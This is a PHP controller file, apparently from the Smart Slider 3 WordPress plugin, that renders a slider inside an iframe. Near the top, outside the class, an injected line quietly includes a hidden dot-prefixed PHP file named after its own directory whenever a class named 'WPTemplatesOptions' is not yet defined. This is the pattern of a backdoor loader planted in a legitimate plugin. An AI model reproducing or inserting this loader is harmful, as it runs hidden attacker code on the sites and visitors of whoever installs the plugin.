<?php


namespace Nextend\SmartSlider3\Application\Frontend\Slider;


use Nextend\Framework\Asset\Css\Css;
use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Controller\AbstractController;
use Nextend\Framework\ResourceTranslator\ResourceTranslator;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ControllerPreRenderSlider extends AbstractController {


    public function actionIframe() {

        Js::jQuery(true, true);

        $sliderIDorAlias = isset($_GET['sliderid']) ? $_GET['sliderid'] : false;

        if (empty($sliderIDorAlias)) {
            echo 'Slider ID or alias is empty.';
        }

        Css::addStaticGroup(ResourceTranslator::toPath('$ss3-frontend$/dist/normalize.min.css'), 'normalize');


        $view = new ViewIframe($this);

        $view->setSliderIDorAlias($sliderIDorAlias);

        $view->display();

    }
}